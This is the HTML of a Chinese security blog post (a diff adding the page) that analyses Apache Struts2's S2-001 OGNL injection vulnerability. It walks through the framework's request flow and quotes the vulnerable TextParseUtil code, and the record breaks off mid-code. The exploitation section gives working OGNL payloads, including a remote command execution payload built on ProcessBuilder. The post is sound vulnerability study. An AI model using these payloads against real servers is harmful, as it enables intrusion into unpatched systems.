@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="eFIczS6pLawspui5Sm7JUbsaANiKGnqjmDod70iSzI4" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[TOC]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全学习之路">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="[TOC]">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424173922.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210421232727.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210421232904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424174835.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424181456.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424221411.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424225908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425213508.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425214115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425214530.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425220738.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425223448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425230921.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425231344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425234506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425234918.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426000224.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426001635.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426001813.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426001955.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426002145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004642.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004712.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004823.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426005757.png">
+<meta property="article:published_time" content="2021-04-21T14:34:57.000Z">
+<meta property="article:modified_time" content="2021-04-25T17:03:56.087Z">
+<meta property="article:author" content="yq1ng">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424173922.jpeg">
+
+<link rel="canonical" href="http://yq1ng.github.io/z_post/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Java安全学习之路 | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全学习之路
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-21 22:34:57" itemprop="dateCreated datePublished" datetime="2021-04-21T22:34:57+08:00">2021-04-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 01:03:56" itemprop="dateModified" datetime="2021-04-26T01:03:56+08:00">2021-04-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[TOC]</p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>提到Java安全，小白入门分析的应该就是struts2了吧，我比较菜，第一次分析的时候各种不会，环境都搭不好，吭吭哧哧终于分析完S2-001，路漫漫其修远兮，一起努力吧  </p>
+<p>复现可以从Vulhub一键搭建，分析的话我是自己搭建的，最后应该会把源码放到gayhub，尽情期待</p>
+<h1 id="Struts2架构及工作原理"><a href="#Struts2架构及工作原理" class="headerlink" title="Struts2架构及工作原理"></a>Struts2架构及工作原理</h1><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424173922.jpeg" alt="img"></p>
+<ul>
+<li>FilterDispatcher：是整个Struts2的调度中心，也就是整个MVC架构中的C（控制中心），它根据ActionMapper的结果来决定是否处理请求。如果ActionMapper指出该URL应该被Struts2处理，那么它将会执行Action处理，并停止过滤器链上还没有执行的过滤器。</li>
+<li>ActionMapper：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li>
+<li>ActionProxy：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间，使得我们在将来有机会引入更多的实现方式，比如通过WebService来实现等。</li>
+<li>ConfigurationManager：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。</li>
+<li>struts.xml：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li>
+<li>ActionInvocation：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li>
+<li>Interceptor：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li>
+<li>Action：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li>
+<li>Result：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li>
+<li>Templates：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li>
+<li>Tag Subsystem：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li>
+</ul>
+<h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>httprequest经过一系列过滤器到达FilterDispatcher调度中心，请求转发至ActionMapper，若需要处理则创建ActionProxy，代理再去struts.xml找对应的action，然后实例化ActionInvocation调用，运行拦截器生成result，根据模板生成响应内容，逆向过滤器，最后http response</p>
+<h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考 <a target="_blank" rel="noopener" href="https://mengsec.com/2019/10/29/Java-Web-Struts2-Env-Build">Java Web安全入门——S2漏洞测试环境搭建</a></p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
+<li>官方描述：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a>) </li>
+<li>一句话总结： XWork 允许 OGNL 表达式递归地执行  </li>
+<li>影响范围：WebWork 2.1 (启用 altSyntax), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登陆失败时会把错误的账户密码留在提交框内  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210421232727.png" alt="image-20210421225311505"></p>
+<p>插入OGNL表达式试试，被解析了  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210421232904.png" alt="image-20210421232904328"></p>
+<p>常用poc  </p>
+<p>获取tomcat路径：<code>%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</code>  </p>
+<p>获取web路径：<code>%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()&#125;</code>   </p>
+<p>还有最喜欢的rce：<code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code>，只需更改<code>java.lang.String[]&#123;&quot;whoami&quot;&#125;</code></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>主要想走一遍流程，漏洞不难，有点啰嗦  </p>
+<p>在自定义Action处下断点，然后POST<code>password=1&amp;username=%&#123;1+2&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424174835.png" alt="image-20210424174830812"></p>
+<p>发送payload后，怎么到达了LoginAction？  </p>
+<p>用户发送请求后，先是Tomcat选择用哪个工件处理请求，并读取web.xml进行匹配，本环境Tomcat发现是Struts2这个过滤器来处理，根据配置找到<code>FilterDispatcher</code>，也就是调度中心，在调度中心执行doFilter方法，询问ActionMapper是否需要Struts2处理</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424181456.png" alt="image-20210424181456433"></p>
+<p>接下来创建代理，询问配置文件找到调用类，配置文件在<code>Dispatcher</code>类的init()(初始化方法)内的<code>this.init_TraditionalXmlConfigurations</code>加载完成，配置文件依次加载、变量覆盖（其实配置文件的真正加载应该是在ConfigurationManager类里面完成的，这里就不跟踪了）  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424221411.png" alt="image-20210424221409372"></p>
+<p>由<code>mapping</code>对象中的name属性在configurationManager（加载Struts2的配置文件）寻找对应的Action，并生成一个ActionProxy，如果这个ActionProxy成功创建的话会执行execute方法</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210424225908.png" alt="image-20210424225908231"></p>
+<p>继续往下走，看调用栈、联想架构图，此时实例化了ActionInvocation（Action完整的调用过程都是由ActionInvocation对象负责），下面就是执行拦截器，但是从下图看，并未找到拦截器的递归调用，莫慌，继续看  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425213508.png" alt="image-20210425213506148"></p>
+<p>看一下intercept接口定义，最后这个函数参数就是递归调用的关键，如果最后在调用<code>invocation.invoke()</code>那就会再回到上一步，继续从 Action 的 Intercepor 列表中找到下一个截拦器。随便抽出来一个拦截器，他也确实是这样工作的  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425214115.png" alt="image-20210425214115083"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425214530.png" alt="image-20210425214529918"></p>
+<p>那么都执行了那些拦截器呢（拦截器的list在初始化完成的辣）？看看strtus.xml中有一句<code>&lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;</code>，看看继承：<code>struts2-core-2.0.8.jar!/struts-default.xml</code>，默认的就是这么多辣，调用栈中也是和这个对应的  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425220738.png" alt="image-20210425220738169"></p>
+<p>其中的<code>params</code>拦截器可以多看看，他会把客户端发来的数据都设置到<code>ValueStack（值栈）</code>里面，以后jsp页面取值都是在值栈中取得的  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425223448.png" alt="image-20210425223446863"></p>
+<p>跟进此函数，在<code>stack.setValue(name, value);</code>将数据入栈  </p>
+<p>拦截器运行完就会进入自定Action，看调用栈，在<code>/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code>调用LoginAction  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425230921.png" alt="image-20210425230446933"></p>
+<p>再往后已经到了第一张图  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425231344.png" alt="image-20210425231343882"></p>
+<p>返回error后DefaultActionInvocation根据<code>struts.xml</code>中配置选取生成页面  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425234506.png" alt="image-20210425234506223"></p>
+<p>接着处理index.jsp，但是jsp的本质也是servlet，执行时tomcat会将其转化为<code>index_jsp.java</code>  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210425234918.png" alt="image-20210425234918023"></p>
+<p>解析标签会在<code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code>中的<code>doStartTag</code>与<code>doEndTag</code>方法内完成  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426000224.png" alt="image-20210426000224116"></p>
+<p>在doEndTag方法内用<code>this.component.end()</code>调用<code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code>内的<code>end()</code>方法来填充jsp内动态数据    </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426001635.png" alt="image-20210426001634829"></p>
+<p>跟进，发现如果开启了 <code>Ognl表达式</code> 支持<code>( this.altSyntax() )</code>，程序会在属性字段两边添加 Ognl 表达式字符( <code>%&#123;&#125;</code> )，然后使用 <code>findValue</code> 方法从值栈中获得该表达式所对应的值  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426001813.png" alt="image-20210426001813423"></p>
+<p>跟进findValue：<code>struts2-core-2.0.8.jar!/org/apache/struts2/components/Component.class</code>，调用<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code>内的translateVariables方法，此方法又调用了同名重载方法</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426001955.png" alt="image-20210426001954853"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426002145.png" alt="image-20210426002145762"></p>
+<p>漏洞定位：<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:31</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> </span>&#123;</span><br><span class="line">        Object result = expression;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> length = expression.length();</span><br><span class="line">            <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = expression.charAt(x++);</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    ++count;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                    --count;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> end = x - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String <span class="keyword">var</span> = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">            Object o 